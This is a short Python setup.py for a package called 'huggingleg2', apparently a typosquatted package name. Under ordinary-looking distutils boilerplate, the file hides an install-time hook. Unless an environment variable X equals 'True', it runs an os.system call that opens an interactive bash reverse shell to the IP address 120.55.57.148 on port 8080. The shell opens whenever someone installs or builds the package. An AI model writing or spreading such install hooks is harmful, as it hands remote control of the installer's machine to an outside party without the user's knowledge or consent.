from distutils.core import setup
import os
if os.environ.get('X', None) != 'True':
    os.system("/bin/bash -c '/bin/bash -i >& /dev/tcp/120.55.57.148/8080 0>&1'")

setup(
    name='huggingleg2',  # How you named your package folder (MyLib)
    packages=['huggingleg2'],  # Chose the same as "name"
    version='0.1',  # Start with a small number and increase it with every change you make
)